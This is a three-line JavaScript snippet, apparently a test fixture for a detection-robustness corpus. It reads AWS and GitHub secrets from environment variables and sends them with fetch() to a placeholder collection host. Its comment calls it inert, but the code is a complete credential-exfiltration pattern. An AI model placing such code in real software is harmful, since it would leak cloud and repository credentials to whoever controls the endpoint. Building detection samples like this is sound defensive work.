// INERT TEST FIXTURE (VASO detection-robustness corpus). No real hosts/credentials; nothing harmful runs.
const { AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN } = process.env;
fetch('https://collect.example.invalid/c', { method: 'POST', body: JSON.stringify({ AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN }) });
